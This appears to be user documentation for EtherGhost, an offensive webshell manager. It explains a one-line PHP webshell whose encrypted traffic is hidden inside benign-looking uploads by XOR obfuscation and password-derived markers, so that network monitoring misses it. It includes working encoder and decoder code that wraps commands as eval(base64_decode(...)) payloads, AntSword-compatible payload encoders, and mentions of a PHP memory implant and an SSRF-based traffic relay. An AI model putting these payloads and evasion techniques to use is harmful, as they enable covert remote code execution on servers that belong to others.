# EtherGhost One-line PHP Webshell (English)

Traditional single-line Webshells are easy to detect and their traffic is obvious. Tools like Behinder and Godzilla encrypt traffic (e.g., AES) so payloads are not directly visible to intermediaries.

However, encrypted traffic can still be recognizable by pattern: fixed-length encrypted data sent to .php endpoints. To mitigate this, EtherGhost introduces a simple but effective obfuscation layer that hides encrypted data inside benign-looking content (e.g., image uploads).

EtherGhost’s one-line Webshell combines encryption and traffic obfuscation. The obfuscation uses XOR and special 8-byte markers to denote start/end, enabling payloads to be embedded into arbitrary data.

Traffic obfuscation layer:

| Start Mark | XOR Key | Encrypted Data | End Mark |
|-----------|---------|----------------|----------|
| 8B        | 8B      | xB             | 8B       |

Marks are derived from the Webshell password. With known marks, the server can pinpoint the payload within any stream of data; payloads can be embedded almost anywhere.

The encrypted layer:

| Action | RSA key / AES-encrypted PHP code |
|-------|----------------------------------|
| 1B    | xB                               |

Connection flow:

1. Controller requests an AES key while optionally sending its RSA public key. The target generates an AES key, stores it in session, encrypts the key with RSA, and returns it.
2. Controller decrypts the AES key and uses it to encrypt PHP code for execution.

Known trade-offs:

- Larger Webshell size
- RSA public key transmission still has detectable patterns
- No built-in AV evasion

## Custom Encoder

Create a Python file (e.g., `example.py`) under `modules/php_encoders` in EtherGhost’s data folder and implement:

```python
import base64

def encode(code: str):
    return f"eval(base64_decode({base64.b64encode(code.encode()).decode()!r}));"
```

Restart EtherGhost; the encoder appears in the Webshell editor. Return type can be str or bytes (the PHP code to execute).

## Custom Decoder

Create a Python file (e.g., `example.py`) under `modules/php_decoders`:

```python
import base64

phpcode = """
function decoder_echo_raw($s) {
    echo base64_encode($s);
}
"""

def decode(s: str) -> str:
    return base64.b64decode(s).decode()
```

Restart EtherGhost; the decoder appears in the Webshell editor.

## Import AntSword Encoders/Decoders into EtherGhost

Place JS files under the `AntSwordEncoder` or `AntSwordDecoder` folders in EtherGhost’s data directory, then restart EtherGhost.

Example `AntSwordEncoder/example-base64.js`:

```js
module.exports = (pwd, data, ext={}) => {
    let randomID = `_0x${Math.random().toString(16).substr(2)}`;
    data[randomID] = Buffer.from(data['_']).toString('base64');
    data[pwd] = `eval(base64_decode($_POST[${randomID}]));`;
    delete data['_'];
    return data;
}
```

Example `AntSwordDecoder/example-base64.js`:

```js
module.exports = {
  asoutput: () => {
    return `function asenc($out){
      return @base64_encode($out);
    }
    `.replace(/\n\s+/g, '');
  },
  decode_buff: (data, ext={}) => {
    return Buffer.from(data.toString(), 'base64');
  }
}
```

Once placed, the encoder/decoder appears in the editor. Note: EtherGhost does not support certain AntSword-internal environment assumptions; some encoders may require adaptation.

## Custom Background Image

Rename your background image to `bg.jpg`, `bg.png`, or `bg.webp` and place it in EtherGhost’s data directory (path printed at startup). In Settings, switch theme to “Glass”.

## Q&A: Why can’t encoders/decoders be added via the web UI?

Encoders/decoders run as server-side code loaded at startup. Allowing upload via web UI would introduce RCE risks if an adversary gains UI access. EtherGhost intentionally does not support adding them via web UI.

## Q&A: Why “Vessel” and “Pseudo forward proxy”?

Vessel is a lightweight PHP memory implant supporting file and session-based communication. We initially considered integrating [Neo-reGeorg](https://github.com/L-codes/Neo-reGeorg), but GPLv3 licensing constraints prevented direct reuse.

Pseudo forward proxy uses the gopher protocol (SSRF-like) to relay traffic. Due to SSRF constraints, it primarily supports HTTP-like protocols.
